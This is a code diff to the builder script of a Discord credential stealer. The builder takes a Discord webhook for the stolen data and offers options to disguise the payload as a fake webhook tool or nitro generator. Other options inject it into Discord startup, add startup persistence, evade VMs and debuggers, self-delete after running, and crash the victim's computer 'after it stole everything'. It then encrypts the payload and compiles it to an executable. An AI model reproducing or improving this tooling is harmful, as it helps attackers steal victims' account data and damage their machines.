@@ -1,4 +1,4 @@
-import os, platform, subprocess, shutil, random
+import os, platform, subprocess, shutil, random, requests
 while True:
     os.makedirs('./Build', exist_ok=True)
     shutil.copy('main.py', './Build/Trap-Stl-Building.py')
@@ -22,14 +22,31 @@ while True:
 
     with open('main.py', 'r', encoding='utf-8', errors='replace') as file:
         content = file.read()
-    Webhook = input('Enter the webhook -> ')
+        
+    while True:
+        try:
+            Webhook = input('Enter the webhook -> ')
+            
+            re = requests.get(Webhook)
+            if re.status_code == 200 and 'discord.com' in Webhook:
+                break
+            else:
+                print('Invalid Webhook')
+        except:
+            print('Invalid Webhook')
     FakeWeb = get_boolean_input('Do you want to enable Fake Webhook Module (When the file is launched it will show a Webhook Tools while getting data) Y/N: ')
     FakeGen = get_boolean_input('Do you want to enable Fake Generator Module (When the file is launched it will show a nitro generator while getting data) Y/N: ')
     Injection = get_boolean_input('Do you want to inject the script to discord Startup Y/N: ')
     Startup = get_boolean_input('Do you want to add the file to the startup folder? Y/N: ')
     No_Debug = get_boolean_input('Do you want to enable VM Checker and Anti Debugging Y/N: ')
     Close = get_boolean_input('Do you want to prevent Discord from being launched again? Y/N: ')
+    OneTime = get_boolean_input('Do you want to add the anti spammer (so he can launch only every 30 minutes) ? Y/N: ')
+    melter = get_boolean_input('Do you enable melter (Delete the file after using it DONT WORK WITH CRASHER) ? Y/N: ')
+    crasher = get_boolean_input('Do you want the program to make the computer crash after it stole everything ? Y/N: ')
 
+    if melter == True:
+        crasher = False
+        
     def generate_key(length):
         key = list(range(256))
         random.shuffle(key)
@@ -41,6 +58,7 @@ while True:
             encrypted_char = key[char]
             encrypted.append(encrypted_char)
         return bytes(encrypted)
+    
     key_length = 512  
     custom_key = generate_key(key_length) 
 
@@ -52,6 +70,10 @@ while True:
     new_content = new_content.replace("'%Startup%'", str(Startup))
     new_content = new_content.replace("'%No_Debug%'", str(No_Debug))
     new_content = new_content.replace("'%Close%'", str(Close))
+    new_content = new_content.replace("'%Onetime%'", str(OneTime))
+    new_content = new_content.replace("'%Melter%'", str(melter))
+    new_content = new_content.replace("'%Crash%'", str(crasher))
+    
     with open(f'./Build/temp.py', 'w', encoding='utf-8') as file:
         file.write(new_content)
     clear_console()
@@ -79,7 +101,9 @@ while True:
                 print(f'[+] File Created {name}.py')
                 if Exe in ['y', 'yes']:
                     pass
-                else:input('Press any key to quit...')
+                else:
+                    input('Press any key to quit...')
+                    quit()
                 break 
         else:
             Obfuscation = input('Invalid input. Please enter Y or N: ')
@@ -91,20 +115,16 @@ while True:
             try:
                 __import__('Crypto')
             except ImportError:
-                subprocess.Popen(f"\"{executable}\" -m pip install 'Crypto' --quiet", shell=True)        
+                subprocess.Popen(f"\"{executable}\" -m pip install 'Crypto' --quiet", shell=True)    
+                subprocess.Popen(f"\"{executable}\" -m pip install 'pycryptodome' --quiet", shell=True)        
 
 
             command = [
-                'nuitka',
+                'pyinstaller',
                 '--onefile',
-                '--include-module=ctypes,sqlite3,Crypto,requests,optparse',
-                f'--output-dir=./Build',
+                f'--distpath Build',  
                 f'./Build/{name}.py'
             ]
-            try:
-                import nuitka
-            except ImportError:
-                subprocess.call(['pip', 'install', 'Nuitka'])
             subprocess.run(command, check=True, shell=True)
             input(f'File {name}.exe successfully created press any key to quit')
             quit()
